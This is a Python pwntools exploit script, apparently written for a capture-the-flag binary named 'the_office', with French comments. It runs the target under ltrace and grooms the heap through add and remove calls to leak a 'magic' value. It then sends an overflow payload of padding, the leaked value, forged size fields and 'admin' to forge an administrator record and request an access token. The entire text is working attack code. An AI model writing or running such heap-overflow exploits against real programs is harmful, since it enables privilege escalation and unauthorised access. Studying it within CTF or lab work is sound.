import sys, re, struct, time
sys.path.insert(0, ".")
from pwn import context, process
context.log_level = "error"
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "./_z_172_exploit2.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

err = open("/tmp/office/lt_adm.txt", "wb")
io = process(["ltrace", "-f", "-e", "fopen+fgets+printf+puts+strcmp+__isoc99_scanf",
              "./the_office"], stderr=err)
io.recvuntil(b"4) Get access token")
ex.add(io, b"A", email=b"a" * 28, salary=1000, phone=b"111")
ex.remove(io, 0)
ex.add(io, b"B", salary=2000, phone=b"222")
ex.add(io, b"C", salary=3000, phone=b"333")
out = ex.listemps(io).decode("latin-1")
magic = int(re.findall(r"Bldg #: (\d+)", out)[-1])
mb = struct.pack("<I", magic)
print("magic = 0x%08x bytes=%r" % (magic, mb))
if any(b in ex.WS for b in mb):
    print("magic avec octet blanc -> relancer"); io.close(); sys.exit(0)
ex.remove(io, 0)
payload = b"A" * 28 + mb + struct.pack("<I", 0x35) * 2 + b"admin\x00"
ex.add(io, b"D", salary=4000, phone=payload)
io.sendline(b"4")
io.recvuntil(b"Employee #?")
io.sendline(b"1")
time.sleep(0.6)
try:
    print("sortie:", repr(io.recv(65536, timeout=2)))
except Exception as e:
    print("recv:", e)
io.close()
err.close()
time.sleep(0.3)
print("=== LTRACE (fin) ===")
print(open("/tmp/office/lt_adm.txt", errors="replace").read()[-1500:])
